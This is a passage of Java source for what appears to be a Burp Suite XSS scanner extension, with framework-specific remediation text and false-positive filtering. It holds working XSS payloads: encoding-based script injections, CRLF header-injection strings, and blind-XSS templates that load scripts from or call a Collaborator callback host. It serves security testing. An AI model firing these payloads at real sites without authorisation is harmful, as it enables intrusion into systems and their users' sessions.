                    + " payloads for param '" + target.name + "'");

            for (String[] payload : payloads) {
                String xssPayload = payload[0];
                String checkFor = payload[1];
                String desc = payload[2];

                // Skip payloads that use blocked characters
                if (!payloadViableWithChars(xssPayload, charSurvival)) {
                    continue;
                }

                HttpRequestResponse result = sendPayload(original, target, xssPayload);
                if (result == null || result.response() == null) continue;

                String body = result.response().bodyToString();

                // For template expression probes ({{7*7}}, ${7*7}): check evaluation
                boolean isTemplateProbe = xssPayload.contains("{{7*7}}") || xssPayload.contains("${7*7}")
                        || xssPayload.contains("<%- 7*7 %>");
                if (isTemplateProbe) {
                    boolean resultPresent = body.contains(checkFor); // e.g., "49"
                    boolean resultInBaseline = canaryBody != null && canaryBody.contains(checkFor);
                    // Check if the template syntax was consumed (not reflected raw)
                    String syntaxMarker = xssPayload.length() > 6 ? xssPayload.substring(0, 4) : xssPayload;
                    boolean syntaxPresent = body.contains(xssPayload);

                    if (resultPresent && !syntaxPresent && !resultInBaseline) {
                        findingsStore.addFinding(Finding.builder("xss-scanner",
                                        "Framework XSS: " + fwName + " — " + desc,
                                        Severity.HIGH, Confidence.FIRM)
                                .url(url).parameter(target.name)
                                .evidence("Payload: " + xssPayload + " | Evaluated to: " + checkFor
                                        + " | Framework: " + fwName)
                                .description("Framework-specific XSS detected via " + desc + ". "
                                        + "The template expression was evaluated by the " + fwName
                                        + " framework, confirming client-side template injection.")
                                .remediation(getFrameworkRemediation(fwName))
                                .requestResponse(result)
                                .payload(xssPayload)
                                .responseEvidence(checkFor)
                                .build());
                        return; // Confirmed XSS for this param
                    }
                } else {
                    // For HTML/JS payloads: check if checkFor marker is present
                    // but NOT already in the baseline response
                    boolean markerInBaseline = canaryBody != null && canaryBody.contains(checkFor);
                    if (!checkFor.isEmpty() && body.contains(checkFor) && !markerInBaseline) {
                        ReflectionVerdict verdict = validateExecutableContext(result, xssPayload, checkFor);
                        if (verdict == ReflectionVerdict.ENCODED) {
                            api.logging().logToOutput("[XSS] Skipping framework payload — HTML-encoded for param '" + target.name + "'");
                            continue;
                        }

                        Severity sev = Severity.HIGH;
                        String verdictNote = "";
                        if (verdict == ReflectionVerdict.NON_HTML_CONTENT_TYPE) {
                            sev = Severity.INFO;
                            verdictNote = " | Reflected in non-HTML response";
                        } else if (verdict == ReflectionVerdict.DEAD_CONTAINER) {
                            sev = Severity.INFO;
                            verdictNote = " | Reflected inside non-executable container";
                        } else if (verdict == ReflectionVerdict.CSP_RESTRICTED) {
                            sev = downgradeSeverity(Severity.HIGH);
                            verdictNote = " | CSP restricts inline execution";
                        }

                        findingsStore.addFinding(Finding.builder("xss-scanner",
                                        "Framework XSS: " + fwName + " — " + desc,
                                        sev, Confidence.FIRM)
                                .url(url).parameter(target.name)
                                .evidence("Payload: " + xssPayload + " | Marker '" + checkFor
                                        + "' found in response | Framework: " + fwName + verdictNote)
                                .description("Framework-specific XSS detected via " + desc + ". "
                                        + "The payload exploits " + fwName + "-specific behavior. "
                                        + "The marker '" + checkFor + "' was found in the response body.")
                                .remediation(getFrameworkRemediation(fwName))
                                .requestResponse(result)
                                .payload(xssPayload)
                                .responseEvidence(checkFor)
                                .build());
                        return; // Confirmed XSS for this param
                    }
                }
                perHostDelay();
            }
        }
    }

    /**
     * Returns framework-specific remediation text.
     */
    private String getFrameworkRemediation(String framework) {
        switch (framework) {
            case "AngularJS":
                return "Upgrade from AngularJS (1.x) to Angular (2+) which does not have a client-side sandbox. "
                        + "If upgrading is not possible, avoid injecting user input into AngularJS template expressions. "
                        + "Use ng-bind instead of {{ }} interpolation. Implement Content Security Policy (CSP) "
                        + "with strict-dynamic. Remove ng-bind-html-unsafe usage and ensure $sce is enabled.";
            case "Angular":
                return "Never bypass Angular's DomSanitizer (avoid bypassSecurityTrustHtml/Script/Url). "
                        + "Do not use server-side composition of Angular templates with user input. "
                        + "Use [textContent] instead of [innerHTML] where possible. Implement strict CSP headers. "
                        + "Validate and sanitize all URL bindings to prevent javascript: scheme injection.";
            case "Vue.js":
                return "Avoid using v-html with user-controlled data. Use {{ }} text interpolation (auto-escaped) "
                        + "instead. Never compile user input as Vue templates (no new Vue({ template: userInput })). "
                        + "Use v-text or v-bind with proper sanitization. Implement Content Security Policy. "
                        + "For Vue 3, ensure template compilation is not available in production builds.";
            case "React":
                return "Never pass user input to dangerouslySetInnerHTML. Sanitize all HTML content with DOMPurify "
                        + "before rendering. Validate href/src attributes to prevent javascript: scheme injection. "
                        + "Use React's built-in JSX escaping for text content. For Next.js, validate all server-side "
                        + "props and avoid exposing sensitive data in __NEXT_DATA__. Implement strict CSP headers.";
            case "jQuery":
                return "Upgrade jQuery to version 3.5.0+ to mitigate known XSS CVEs (CVE-2012-6708, CVE-2020-11023). "
                        + "Avoid using .html(), .append(), .prepend() with user-controlled data. Use .text() for "
                        + "text content. Never pass user input to $() selector — use .find() on a known container. "
                        + "Sanitize HTML with DOMPurify before using $.parseHTML(). Avoid $.globalEval().";
            default:
                return "Sanitize all user input before rendering in the framework. Implement Content Security Policy. "
                        + "Use framework-provided safe APIs for rendering user content.";
        }
    }

    // ==================== ENCODING NEGOTIATION XSS (Improvement 6) ====================

    /**
     * Tests for charset-based XSS vectors. Only runs if the response Content-Type
     * is missing charset specification or uses a non-UTF-8 encoding.
     */
    private void testEncodingXss(HttpRequestResponse original, XssTarget target,
                                  String url) throws InterruptedException {
        // First check if encoding-based tests are applicable
        HttpRequestResponse baseline = sendPayload(original, target, CANARY);
        if (baseline == null || baseline.response() == null) return;

        String contentType = "";
        for (var h : baseline.response().headers()) {
            if (h.name().equalsIgnoreCase("Content-Type")) {
                contentType = h.value().toLowerCase();
                break;
            }
        }

        // Only test if charset is missing or non-UTF-8
        boolean missingCharset = !contentType.contains("charset");
        boolean nonUtf8 = contentType.contains("charset") && !contentType.contains("utf-8");
        if (!missingCharset && !nonUtf8) {
            api.logging().logToOutput("[XSS] Encoding XSS skipped — UTF-8 charset specified for param '"
                    + target.name + "'");
            return;
        }

        api.logging().logToOutput("[XSS] Testing encoding-based XSS for param '" + target.name
                + "' (charset: " + (missingCharset ? "MISSING" : contentType) + ")");

        String[][] encodingPayloads = {
                // UTF-7 injection (legacy browsers)
                {"+ADw-script+AD4-alert(1)+ADw-/script+AD4-", "alert(1)", "UTF-7 injection"},
                {"+ADw-img src+AD0-x onerror+AD0-alert(1)+AD4-", "alert(1)", "UTF-7 img tag"},
                // ISO-2022-JP escape sequence
                {"\u001b(J<script>alert(1)</script>", "<script>alert(1)</script>", "ISO-2022-JP escape"},
                // Overlong UTF-8 (some decoders accept)
                {"\u00c0\u00bcscript\u00c0\u00bealert(1)\u00c0\u00bc/script\u00c0\u00be", "alert(1)", "Overlong UTF-8"},
        };

        for (String[] entry : encodingPayloads) {
            String payload = entry[0];
            String checkFor = entry[1];
            String technique = entry[2];

            HttpRequestResponse result = sendPayload(original, target, payload);
            if (result == null || result.response() == null) continue;

            String body = result.response().bodyToString();

            // Also check baseline doesn't already contain the marker
            String encodingBaselineBody = baseline.response().bodyToString();
            if (!checkFor.isEmpty() && body.contains(checkFor)
                    && (encodingBaselineBody == null || !encodingBaselineBody.contains(checkFor))) {
                ReflectionVerdict verdict = validateExecutableContext(result, payload, checkFor);
                if (verdict == ReflectionVerdict.ENCODED) {
                    api.logging().logToOutput("[XSS] Skipping encoding XSS — payload HTML-encoded for param '" + target.name + "'");
                    continue;
                }

                Severity sev = Severity.MEDIUM;
                String verdictNote = "";
                if (verdict == ReflectionVerdict.NON_HTML_CONTENT_TYPE) {
                    sev = Severity.INFO;
                    verdictNote = " | Reflected in non-HTML response";
                } else if (verdict == ReflectionVerdict.DEAD_CONTAINER) {
                    sev = Severity.INFO;
                    verdictNote = " | Reflected inside non-executable container";
                } else if (verdict == ReflectionVerdict.CSP_RESTRICTED) {
                    sev = downgradeSeverity(Severity.MEDIUM);
                    verdictNote = " | CSP restricts inline execution";
                }

                findingsStore.addFinding(Finding.builder("xss-scanner",
                                "XSS via Encoding Negotiation: " + technique,
                                sev, Confidence.FIRM)
                        .url(url).parameter(target.name)
                        .evidence("Technique: " + technique + " | Payload: "
                                + truncate(payload, 100) + " | Marker found in response"
                                + " | Content-Type: " + contentType + verdictNote)
                        .description("XSS possible via " + technique + ". The response "
                                + (missingCharset ? "does not specify a charset"
                                : "uses non-UTF-8 charset '" + contentType + "'")
                                + ", allowing encoding-based XSS vectors. The injected payload "
                                + "was decoded and the marker '" + checkFor + "' appeared in the response.")
                        .remediation("Always specify charset=UTF-8 in the Content-Type header. "
                                + "Add: Content-Type: text/html; charset=UTF-8")
                        .requestResponse(result)
                        .payload(payload)
                        .responseEvidence(checkFor)
                        .build());
                return;
            }
            perHostDelay();
        }
    }

    // ==================== RESPONSE HEADER INJECTION XSS (Improvement 7) ====================

    /**
     * Tests for reflection in response headers and CRLF injection leading to XSS.
     * If input is reflected in a response header, tries CRLF injection to inject HTML.
     */
    private void testHeaderReflectionXss(HttpRequestResponse original, XssTarget target,
                                          String url) throws InterruptedException {
        // Step 1: Check if canary appears in any response header
        HttpRequestResponse canaryResult = sendPayload(original, target, CANARY);
        if (canaryResult == null || canaryResult.response() == null) return;

        boolean reflectedInHeader = false;
        String reflectedHeaderName = "";
        for (var header : canaryResult.response().headers()) {
            if (header.value().contains(CANARY)) {
                reflectedInHeader = true;
                reflectedHeaderName = header.name();
                break;
            }
        }

        if (!reflectedInHeader) return;

        api.logging().logToOutput("[XSS] Canary reflected in response header '"
                + reflectedHeaderName + "' for param '" + target.name + "'");

        findingsStore.addFinding(Finding.builder("xss-scanner",
                        "Input Reflected in Response Header: " + reflectedHeaderName,
                        Severity.MEDIUM, Confidence.FIRM)
                .url(url).parameter(target.name)
                .evidence("Canary '" + CANARY + "' found in response header '"
                        + reflectedHeaderName + "'")
                .description("User input from parameter '" + target.name + "' is reflected in "
                        + "the response header '" + reflectedHeaderName + "'. Testing for CRLF "
                        + "injection to achieve XSS via header injection.")
                .requestResponse(canaryResult)
                .payload(CANARY)
                .responseEvidence(CANARY)
                .build());

        // Step 2: Try CRLF injection
        String[][] crlfPayloads = {
                {CANARY + "\r\n\r\n<script>alert(1)</script>",
                        "<script>alert(1)</script>", "Raw CRLF injection"},
                {CANARY + "%0d%0a%0d%0a<script>alert(1)</script>",
                        "<script>alert(1)</script>", "URL-encoded CRLF injection"},
                {CANARY + "\r\nContent-Type: text/html\r\n\r\n<script>alert(1)</script>",
                        "<script>alert(1)</script>", "CRLF with Content-Type override"},
                {CANARY + "%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<img src=x onerror=alert(1)>",
                        "onerror=alert", "URL-encoded CRLF + Content-Type"},
        };

        for (String[] entry : crlfPayloads) {
            String payload = entry[0];
            String checkFor = entry[1];
            String technique = entry[2];

            HttpRequestResponse result = sendPayload(original, target, payload);
            if (result == null || result.response() == null) continue;

            String body = result.response().bodyToString();

            if (body.contains(checkFor)) {
                ReflectionVerdict verdict = validateExecutableContext(result, payload, checkFor);
                if (verdict == ReflectionVerdict.ENCODED) {
                    api.logging().logToOutput("[XSS] Skipping CRLF XSS — payload HTML-encoded for param '" + target.name + "'");
                    continue;
                }

                Severity sev = Severity.HIGH;
                String verdictNote = "";
                if (verdict == ReflectionVerdict.NON_HTML_CONTENT_TYPE) {
                    sev = Severity.INFO;
                    verdictNote = " | Reflected in non-HTML response";
                } else if (verdict == ReflectionVerdict.DEAD_CONTAINER) {
                    sev = Severity.INFO;
                    verdictNote = " | Reflected inside non-executable container";
                } else if (verdict == ReflectionVerdict.CSP_RESTRICTED) {
                    sev = downgradeSeverity(Severity.HIGH);
                    verdictNote = " | CSP restricts inline execution";
                }

                findingsStore.addFinding(Finding.builder("xss-scanner",
                                "XSS via Header Injection (CRLF): " + technique,
                                sev, Confidence.FIRM)
                        .url(url).parameter(target.name)
                        .evidence("Technique: " + technique + " | Reflected header: "
                                + reflectedHeaderName + " | Injected HTML found in response body" + verdictNote)
                        .description("CRLF injection in the '" + reflectedHeaderName + "' response header "
                                + "allows injecting arbitrary response body content via " + technique + ". "
                                + "The injected HTML marker '" + checkFor + "' appeared in the response body, "
                                + "confirming XSS via header injection.")
                        .remediation("Sanitize user input before reflecting in response headers. "
                                + "Strip or reject CR (\\r) and LF (\\n) characters. Use framework-level "
                                + "header-setting methods that prevent CRLF injection.")
                        .requestResponse(result)
                        .payload(payload)
                        .responseEvidence(checkFor)
                        .build());
                return;
            }
            perHostDelay();
        }
    }

    // ==================== BLIND XSS VIA COLLABORATOR ====================

    private void testBlindXss(HttpRequestResponse original, XssTarget target, String url) throws InterruptedException {
        // Each blind payload gets its own Collaborator callback for precise attribution
        String[][] blindPayloadTemplates = {
                {"\"><script src=https://COLLAB></script>", "script src"},
                {"'\"><img src=x onerror=fetch('https://COLLAB')>", "img onerror fetch"},
                {"\"><img src=https://COLLAB>", "img src direct"},
                {"\"><input onfocus=fetch('https://COLLAB') autofocus>", "input onfocus autofocus"},
                {"\"><svg onload=fetch('https://COLLAB')>", "SVG onload fetch"},
                {"\"><body onload=fetch('https://COLLAB')>", "body onload fetch"},
                {"javascript:fetch('https://COLLAB')//", "javascript: scheme fetch"},
                {"\"><link rel=stylesheet href=https://COLLAB>", "link stylesheet import"},
                {"\"><object data=https://COLLAB>", "object data tag"},
        };

        for (String[] entry : blindPayloadTemplates) {
            String template = entry[0];
            String technique = entry[1];

            AtomicReference<HttpRequestResponse> sentRequest = new AtomicReference<>();
            String collabDomain = collaboratorManager.generatePayload(
                    "xss-scanner", url, target.name, "Blind XSS OOB (" + technique + ")",
                    interaction -> {
                        findingsStore.addFinding(Finding.builder("xss-scanner",
                                        "Blind XSS via Out-of-Band Interaction (" + technique + ")",
                                        Severity.CRITICAL, Confidence.CERTAIN)
                                .url(url).parameter(target.name)
                                .evidence("Collaborator " + interaction.type().name()
                                        + " interaction from " + interaction.clientIp()
                                        + " at " + interaction.timeStamp()
                                        + " | Technique: " + technique)
                                .description("Blind XSS confirmed via Burp Collaborator using " + technique + " technique. "
                                        + "The injected payload was rendered in a different context (e.g., admin panel, "
                                        + "log viewer, email) and triggered an out-of-band " + interaction.type().name()
                                        + " callback. Parameter '" + target.name + "' is vulnerable.")
                                .requestResponse(sentRequest.get())
                                .payload(template)
                                .build());
                        api.logging().logToOutput("[XSS Blind] Confirmed OOB interaction! "
                                + url + " param=" + target.name + " technique=" + technique);
                    }
            );

            if (collabDomain == null) continue;

            String payload = template.replace("COLLAB", collabDomain);
            HttpRequestResponse result = sendPayload(original, target, payload);
            sentRequest.set(result);
            perHostDelay();
        }
    }

    // ==================== CONTEXT IDENTIFICATION ====================

    private String identifyContext(String body, String canary) {
        int idx = body.indexOf(canary);
        if (idx < 0) return "HTML_BODY";

        // Get surrounding context (500 chars before and after)
        String before = body.substring(Math.max(0, idx - 500), idx);
        String after = body.substring(idx, Math.min(body.length(), idx + canary.length() + 500));

        // Check if inside HTML comment
        if (before.lastIndexOf("<!--") > before.lastIndexOf("-->")) {
            return "HTML_COMMENT";
        }

        // Check if inside <script> tag
        int lastScriptOpen = before.toLowerCase().lastIndexOf("<script");
        int lastScriptClose = before.toLowerCase().lastIndexOf("</script");
        if (lastScriptOpen > lastScriptClose) {
            // Inside a script block - check if in a string
            // Count unescaped quotes before the canary within the script
            String scriptContent = before.substring(lastScriptOpen);
            if (isInJsString(scriptContent, '\'') || isInJsString(scriptContent, '"')) {
                return "JS_STRING";
            }
            if (scriptContent.contains("`") && countOccurrences(scriptContent, '`') % 2 == 1) {
                return "JS_TEMPLATE_LITERAL";
            }
            return "JS_STRING"; // Default to JS string if in script
        }

        // Check if inside <style> tag
        int lastStyleOpen = before.toLowerCase().lastIndexOf("<style");
        int lastStyleClose = before.toLowerCase().lastIndexOf("</style");
        if (lastStyleOpen > lastStyleClose) {
            return "CSS_CONTEXT";
        }

        // Check if inside an HTML attribute
        int lastAngleBracket = before.lastIndexOf('<');
        int lastCloseAngle = before.lastIndexOf('>');
        if (lastAngleBracket > lastCloseAngle) {
            // Inside a tag — check if inside attribute value
            String tagContent = before.substring(lastAngleBracket);
            if (tagContent.contains("=\"") || tagContent.contains("='")) {
                return "HTML_ATTRIBUTE";
            }
        }

        return "HTML_BODY";
    }

    private boolean isInJsString(String content, char quoteChar) {
        int count = 0;
        for (int i = 0; i < content.length(); i++) {
            if (content.charAt(i) == quoteChar) {
                if (i == 0 || content.charAt(i - 1) != '\\') {
                    count++;
                }
            }
        }
        return count % 2 == 1; // Odd count means we're inside a string
    }

    private int countOccurrences(String s, char c) {
        int count = 0;
        for (int i = 0; i < s.length(); i++) {
            if (s.charAt(i) == c) count++;
        }
        return count;
    }

    // ==================== HELPERS ====================

    private HttpRequestResponse sendPayload(HttpRequestResponse original, XssTarget target, String payload) {
        try {
            HttpRequest modified;
            switch (target.type) {
                case QUERY:
                    modified = original.request().withUpdatedParameters(
                            HttpParameter.urlParameter(target.name, PayloadEncoder.encode(payload)));
                    break;
                case BODY:
                    modified = original.request().withUpdatedParameters(
                            HttpParameter.bodyParameter(target.name, PayloadEncoder.encode(payload)));
                    break;
                case COOKIE:
                    modified = PayloadEncoder.injectCookie(original.request(), target.name, payload);
                    break;
                case JSON:
                    modified = injectJsonPayload(original.request(), target.name, payload);
                    break;
                case HEADER:
                    modified = original.request().withRemovedHeader(target.name)
                            .withAddedHeader(target.name, payload);
                    break;
                case PATH:
                    modified = injectPathPayload(original.request(), target.name, payload);
                    if (modified == null) return null;
                    break;
                default:
                    return null;
            }
            api.logging().logToOutput("[XSS] Sending payload to param '" + target.name + "': "
                    + payload.substring(0, Math.min(80, payload.length()))
                    + " → " + modified.url());
            HttpRequestResponse result = api.http().sendRequest(modified);
            if (result == null || result.response() == null) return null;
            api.logging().logToOutput("[XSS] Response: HTTP " + result.response().statusCode()
                    + " (" + result.response().bodyToString().length() + " chars)");
            return result;
        } catch (Exception e) {
            api.logging().logToError("[XSS] sendPayload FAILED for param '" + target.name
                    + "' payload='" + payload.substring(0, Math.min(50, payload.length()))
                    + "': " + e.getClass().getName() + ": " + e.getMessage());
            return null;
        }
    }

    /**
     * Inject a payload into a JSON body, supporting dot-notation keys for nested objects.
     */
    private HttpRequest injectJsonPayload(HttpRequest request, String dotKey, String payload) {
        try {
            String body = request.bodyToString();
            com.google.gson.JsonElement root = com.google.gson.JsonParser.parseString(body);
            if (!root.isJsonObject()) return request;

            String escaped = payload.replace("\\", "\\\\").replace("\"", "\\\"");
            String[] parts = dotKey.split("\\.");

            if (parts.length == 1) {
                // Top-level key — simple regex replacement
                String pattern = "\"" + java.util.regex.Pattern.quote(dotKey) + "\"\\s*:\\s*(?:\"[^\"]*\"|\\d+(?:\\.\\d+)?|true|false|null)";
                String replacement = "\"" + dotKey + "\": \"" + escaped + "\"";
                return request.withBody(body.replaceFirst(pattern, replacement));
            }

            // Nested key — navigate to parent object and replace the leaf value
            com.google.gson.JsonObject current = root.getAsJsonObject();
            for (int i = 0; i < parts.length - 1; i++) {
                com.google.gson.JsonElement child = current.get(parts[i]);
                if (child == null || !child.isJsonObject()) return request;
                current = child.getAsJsonObject();
            }
            String leafKey = parts[parts.length - 1];
            current.addProperty(leafKey, payload);
            return request.withBody(new com.google.gson.Gson().toJson(root));
        } catch (Exception e) {
            // Fallback: simple regex replacement for flat key
            String body = request.bodyToString();
            String escaped = payload.replace("\\", "\\\\").replace("\"", "\\\"");
            String pattern = "\"" + java.util.regex.Pattern.quote(dotKey) + "\"\\s*:\\s*(?:\"[^\"]*\"|\\d+(?:\\.\\d+)?|true|false|null)";
            String replacement = "\"" + dotKey + "\": \"" + escaped + "\"";
            return request.withBody(body.replaceFirst(pattern, replacement));
        }
    }

    /**
     * Inject a payload into a URL path segment, replacing the segment identified by name.
     * The target.name for PATH type contains "path:INDEX:ORIGINAL_VALUE".
     */
    private HttpRequest injectPathPayload(HttpRequest request, String targetName, String payload) {
        try {
            // Parse target name format: "path:INDEX:ORIGINAL_VALUE"
            String[] parts = targetName.split(":", 3);
            if (parts.length < 3) return null;
            int segmentIndex = Integer.parseInt(parts[1]);

            String urlStr = request.url();
            // Extract path portion
            String path = extractPath(urlStr);
            String[] segments = path.split("/");

            if (segmentIndex < 0 || segmentIndex >= segments.length) return null;

            // Replace the segment with the payload
            segments[segmentIndex] = PayloadEncoder.encode(payload);
            String newPath = String.join("/", segments);

            // Reconstruct the URL with the new path
            return request.withPath(newPath);
        } catch (Exception e) {
            api.logging().logToError("[XSS] injectPathPayload failed: " + e.getMessage());
            return null;
        }
    }

    private List<XssTarget> extractTargets(HttpRequest request) {
        List<XssTarget> targets = new ArrayList<>();
        for (var param : request.parameters()) {
            switch (param.type()) {
                case URL:
                    targets.add(new XssTarget(param.name(), param.value(), XssTargetType.QUERY));
                    break;
                case BODY:
                    targets.add(new XssTarget(param.name(), param.value(), XssTargetType.BODY));
                    break;
                case COOKIE:
                    targets.add(new XssTarget(param.name(), param.value(), XssTargetType.COOKIE));
                    break;
            }
        }

        // JSON body parameters — recursive traversal with dot-notation keys
        String contentType = "";
        for (var h : request.headers()) {
            if (h.name().equalsIgnoreCase("Content-Type")) {
                contentType = h.value();
                break;
            }
        }
        if (contentType.contains("application/json")) {
            try {
                String body = request.bodyToString();
                if (body != null && !body.isBlank()) {
                    com.google.gson.JsonElement el = com.google.gson.JsonParser.parseString(body);
                    if (el.isJsonObject()) {
                        extractJsonXssTargets(el.getAsJsonObject(), "", targets);
                    }
                }
            } catch (Exception ignored) {}
        }

        // XSS-relevant headers — commonly reflected in responses
        String[] xssHeaders = {"User-Agent", "Referer", "X-Forwarded-For", "Origin"};
        for (String headerName : xssHeaders) {
            String headerValue = "";
            for (var h : request.headers()) {
                if (h.name().equalsIgnoreCase(headerName)) {
                    headerValue = h.value();
                    break;
                }
            }
            targets.add(new XssTarget(headerName, headerValue, XssTargetType.HEADER));
        }

        // URL path segments (Improvement 3)
        if (config.getBool("xss.pathSegments.enabled", true)) {
            extractPathSegmentTargets(request, targets);
        }

        return targets;
    }

    /**
     * Extracts testable URL path segments as XSS targets.
     * Skips common route words, purely numeric IDs, and short segments.
     */
    private void extractPathSegmentTargets(HttpRequest request, List<XssTarget> targets) {
        try {
            String path = extractPath(request.url());
            if (path == null || path.length() < 2) return;

            String[] segments = path.split("/");
            for (int i = 0; i < segments.length; i++) {
                String segment = segments[i].trim();
                if (segment.isEmpty()) continue;

                // Skip purely numeric segments (IDs like /users/123)
                if (segment.matches("^\\d+$")) continue;

                // Skip UUID-like segments
                if (segment.matches("^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$")) continue;

                // Skip segments that match common route words
                if (COMMON_ROUTE_WORDS.contains(segment.toLowerCase())) continue;

                // Skip very short segments (1-2 chars) — unlikely to be user-controlled
                if (segment.length() < 3) continue;

                // Skip segments that are purely lowercase alpha (likely route names)
                if (segment.matches("^[a-z]+$") && segment.length() < 10) continue;

                // Skip file extensions (e.g., "style.css", "app.js")
                if (segment.contains(".") && segment.matches(".*\\.(css|js|png|jpg|gif|svg|ico|woff|ttf|map)$")) continue;

                // This segment looks like a user-controlled value — add as target
                String targetName = "path:" + i + ":" + segment;
                targets.add(new XssTarget(targetName, segment, XssTargetType.PATH));
            }
        } catch (Exception e) {
            api.logging().logToError("[XSS] Path segment extraction failed: " + e.getMessage());
        }
    }

    /**
     * Recursively extract all string-valued JSON parameters using dot-notation keys.
     */
    private void extractJsonXssTargets(com.google.gson.JsonObject obj, String prefix, List<XssTarget> targets) {
        for (String key : obj.keySet()) {
            com.google.gson.JsonElement val = obj.get(key);
            String fullKey = prefix.isEmpty() ? key : prefix + "." + key;
            if (val.isJsonPrimitive() && (val.getAsJsonPrimitive().isString() || val.getAsJsonPrimitive().isNumber())) {
                targets.add(new XssTarget(fullKey, val.getAsString(), XssTargetType.JSON));
            } else if (val.isJsonObject()) {
                extractJsonXssTargets(val.getAsJsonObject(), fullKey, targets);
            }
        }
    }

    private String extractPath(String url) {
        try {
            if (url.contains("://")) url = url.substring(url.indexOf("://") + 3);
            int s = url.indexOf('/');
            if (s >= 0) { int q = url.indexOf('?', s); return q >= 0 ? url.substring(s, q) : url.substring(s); }
        } catch (Exception ignored) {}
        return url;
    }

    private void perHostDelay() throws InterruptedException {
        int delay = config.getInt("xss.perHostDelay", 300);
        if (delay > 0) Thread.sleep(delay);
    }

    @Override
    public void destroy() {
        frameworkCachePerHost.clear();
    }

    private enum XssTargetType { QUERY, BODY, COOKIE, JSON, HEADER, PATH }

    private static class XssTarget {
        final String name, originalValue;
        final XssTargetType type;
        XssTarget(String n, String v, XssTargetType t) { name = n; originalValue = v != null ? v : ""; type = t; }
    }

    private static String truncate(String s, int max) {
        if (s == null) return "";
        return s.length() > max ? s.substring(0, max) + "..." : s;
    }

    // ==================== REFLECTION VERDICT: FALSE POSITIVE REDUCTION ====================

    private enum ReflectionVerdict {
        EXECUTABLE,            // Payload is in executable HTML context — report as-is
        ENCODED,               // Payload is HTML-encoded (neutralized) — discard finding
        DEAD_CONTAINER,        // Inside <textarea>, <title>, etc. — downgrade to INFO
        NON_HTML_CONTENT_TYPE, // Response is JSON/text/XML — downgrade to INFO or discard if nosniff
        CSP_RESTRICTED         // CSP blocks inline scripts — downgrade severity by one level
    }

    /**
     * Validates whether a reflected payload lands in an executable context.
     * Called after body.contains(checkFor) confirms reflection, before creating a finding.
     * Returns a verdict that determines whether to report, downgrade, or discard the finding.
     */
    private ReflectionVerdict validateExecutableContext(HttpRequestResponse result, String payload, String checkFor) {
        String body = result.response().bodyToString();

        // 1. Encoding check — highest-impact false positive reduction
        String encodedMarker = htmlEncode(checkFor);
        if (!encodedMarker.equals(checkFor)) {
            // The marker contains HTML-special chars, so encoding check is meaningful
            if (body.contains(encodedMarker)) {
                // Encoded form exists — check if raw form appears independently
                String strippedBody = body.replace(encodedMarker, "");
                if (!strippedBody.contains(checkFor)) {
                    // Every raw occurrence is inside an encoded occurrence — fully neutralized
                    return ReflectionVerdict.ENCODED;
                }
            }
        }

        // 2. Content-Type check — non-HTML responses don't execute inline scripts
        String contentType = "";
        boolean hasNosniff = false;
        for (var h : result.response().headers()) {
            if (h.name().equalsIgnoreCase("Content-Type")) {
                contentType = h.value().toLowerCase();
            }
            if (h.name().equalsIgnoreCase("X-Content-Type-Options")
                    && h.value().toLowerCase().contains("nosniff")) {
                hasNosniff = true;
            }
        }

        String ctLower = contentType.split(";")[0].trim(); // Strip charset param
        boolean isNonHtml = ctLower.startsWith("application/json")
                || ctLower.startsWith("text/plain")
                || ctLower.startsWith("application/xml")
                || ctLower.startsWith("text/xml")
                || ctLower.startsWith("text/css")
                || ctLower.startsWith("application/javascript")
                || ctLower.startsWith("text/javascript")
                || ctLower.startsWith("image/")
                || ctLower.startsWith("application/octet-stream");

        if (isNonHtml) {
            if (hasNosniff) {
                return ReflectionVerdict.ENCODED; // Discard — browser won't MIME-sniff
            }
            return ReflectionVerdict.NON_HTML_CONTENT_TYPE;
        }

        // 3. Dead container check — RCDATA/RAWTEXT elements that don't execute scripts
        int idx = body.indexOf(checkFor);
        if (idx > 0) {
            String before = body.substring(Math.max(0, idx - 500), idx).toLowerCase();

            String[][] deadContainers = {
                    {"<textarea", "</textarea"},
                    {"<title", "</title"},
                    {"<noscript", "</noscript"},
                    {"<xmp", "</xmp"},
                    {"<style", "</style"},
            };

            for (String[] container : deadContainers) {
                int openIdx = before.lastIndexOf(container[0]);
                if (openIdx >= 0) {
                    int closeIdx = before.lastIndexOf(container[1]);
                    if (closeIdx < openIdx) {
                        // Opening tag found after last closing tag — we're inside this container
                        return ReflectionVerdict.DEAD_CONTAINER;
                    }
                }
            }

            // Check <plaintext> — no close tag needed, everything after is plain text
            if (before.contains("<plaintext")) {
                return ReflectionVerdict.DEAD_CONTAINER;
            }

            // Check HTML comment — safety net for context detection
            int commentOpen = before.lastIndexOf("<!--");
            int commentClose = before.lastIndexOf("-->");
            if (commentOpen >= 0 && commentOpen > commentClose) {
                return ReflectionVerdict.DEAD_CONTAINER;
            }
        }

        // 4. CSP check — Content-Security-Policy restricting inline scripts
        for (var h : result.response().headers()) {
            if (h.name().equalsIgnoreCase("Content-Security-Policy")) {
                String csp = h.value().toLowerCase();
                // Parse script-src directive
                int scriptSrcIdx = csp.indexOf("script-src");
                if (scriptSrcIdx >= 0) {
                    // Extract the directive value (until next ; or end)
                    int endIdx = csp.indexOf(';', scriptSrcIdx);
                    String scriptSrc = endIdx >= 0
                            ? csp.substring(scriptSrcIdx, endIdx)
                            : csp.substring(scriptSrcIdx);
                    if (!scriptSrc.contains("'unsafe-inline'")) {
                        return ReflectionVerdict.CSP_RESTRICTED;
                    }
                }
                break;
            }
        }

        // 5. Default — payload is in executable context
        return ReflectionVerdict.EXECUTABLE;
    }

    /**
     * HTML-encodes characters that would be neutralized by server-side encoding.
     */
    private static String htmlEncode(String s) {
        return s.replace("&", "&amp;")   // & first to avoid double-encoding
                .replace("<", "&lt;")
                .replace(">", "&gt;")
                .replace("\"", "&quot;")
                .replace("'", "&#x27;")
                .replace("/", "&#x2F;");
    }

    /**
     * Downgrades severity by one level for CSP-restricted findings.
     */
    private static Severity downgradeSeverity(Severity s) {
        return switch (s) {
            case CRITICAL -> Severity.HIGH;
            case HIGH -> Severity.MEDIUM;
            case MEDIUM -> Severity.LOW;
            case LOW, INFO -> Severity.INFO;
        };
    }

}
